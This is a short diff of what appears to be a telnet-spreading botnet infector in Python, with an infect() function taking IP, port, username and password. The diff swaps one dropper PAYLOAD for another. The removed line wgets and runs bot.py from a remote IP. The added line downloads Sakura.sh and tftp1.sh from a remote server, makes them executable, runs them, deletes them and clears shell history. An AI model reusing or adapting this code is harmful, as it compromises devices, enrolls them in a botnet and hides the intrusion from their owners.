@@ -1,7 +1,7 @@
 import telnetlib
 import threading
 
-PAYLOAD = "(cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;) && wget http://134.255.234.140:8080/bot.py -O bot.py && chmod +x bot.py && (python3 bot.py || python bot.py)"
+PAYLOAD = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.146.253.213/Sakura.sh; chmod 777 *; sh Sakura.sh; tftp -g 45.146.253.213 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c"
 
 def infect(ip, port, user, passwd):
     try:
